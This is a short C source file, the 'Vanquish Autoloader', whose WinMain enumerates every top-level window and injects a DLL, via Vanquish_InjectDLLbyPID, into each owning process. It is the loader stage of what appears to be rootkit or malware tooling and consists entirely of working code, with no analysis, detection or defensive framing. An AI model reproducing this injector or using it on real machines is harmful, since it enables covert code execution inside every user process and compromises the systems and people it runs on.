/******************************************************************************\

	Vanquish Autoloader - Copyright (c)2003 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include <windows.h>
#include "..\Injector.h"
#include "..\Utils.h"

DECLARE_MODULE(KERNEL32);

//prototypes
BOOL CALLBACK MyEnumWindowsProc(HWND hWnd, LPARAM lParam);

//implementation
BOOL CALLBACK MyEnumWindowsProc(HWND hWnd, LPARAM lParam)
{
	DWORD pid;

	GetWindowThreadProcessId(hWnd, &pid);
	Vanquish_InjectDLLbyPID(pid);

	return TRUE; //continue enumerating
}

//the WinMain thing...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	//needs to be declared before Vanquish_PrepareInjector() for ADDR_OF() functionality
	LOAD_MODULE(KERNEL32);

	if (!Vanquish_PrepareInjector()) return 0; //if we can't update injector we will crash windows

	//enumerate and update ALL windows!
	EnumWindows((WNDENUMPROC)MyEnumWindowsProc, 0);

	return 0;
}